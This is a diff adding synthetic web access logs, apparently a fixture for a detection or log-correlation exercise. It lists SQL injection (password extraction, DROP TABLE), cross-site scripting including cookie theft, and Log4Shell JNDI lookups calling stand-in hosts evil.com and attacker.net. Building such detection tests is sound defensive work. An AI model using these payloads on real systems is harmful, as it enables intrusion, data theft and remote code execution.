@@ -1,0 +1,19 @@
+# LOGS FOR VULN 1 (SQLi on 192.168.1.10)
+203.0.113.5 - - [24/Aug/2026:10:15:23 +0000] "GET /login?id=admin%27%20OR%20%271%27%3D%271 HTTP/1.1" 500 512
+203.0.113.5 - - [24/Aug/2026:10:15:25 +0000] "GET /login?id=UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 500 512
+203.0.113.5 - - [24/Aug/2026:10:15:27 +0000] "GET /login?id=1%20OR%201%3D1%3B%20DROP%20TABLE%20users HTTP/1.1" 500 512
+
+# LOGS FOR VULN 2 (XSS on 10.10.10.25)
+45.33.22.11 - - [24/Aug/2026:10:20:10 +0000] "GET /search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1" 200 1024
+45.33.22.11 - - [24/Aug/2026:10:20:12 +0000] "GET /search?q=javascript%3Aalert%28document.cookie%29 HTTP/1.1" 200 1024
+45.33.22.11 - - [24/Aug/2026:10:20:14 +0000] "GET /search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E HTTP/1.1" 200 1024
+
+# LOGS FOR VULN 3 (Log4Shell on 10.10.10.25)
+198.51.100.7 - - [24/Aug/2026:10:25:00 +0000] "GET /api/v1/data?user=${jndi:ldap://evil.com/a} HTTP/1.1" 500 512
+198.51.100.7 - - [24/Aug/2026:10:25:02 +0000] "GET /api/v1/data?user=${jndi:rmi://evil.com/a} HTTP/1.1" 500 512
+198.51.100.7 - - [24/Aug/2026:10:25:04 +0000] "GET /api/v1/data?user=${jndi:ldap://attacker.net/exploit} HTTP/1.1" 500 512
+
+# NORMAL/LEGITIMATE TRAFFIC (No correlation)
+192.168.1.5 - - [24/Aug/2026:10:30:00 +0000] "GET /index.html HTTP/1.1" 200 1024
+10.0.0.2 - - [24/Aug/2026:10:30:15 +0000] "GET /about.html HTTP/1.1" 200 2048
+192.168.1.10 - - [24/Aug/2026:10:30:30 +0000] "GET /favicon.ico HTTP/1.1" 404 256
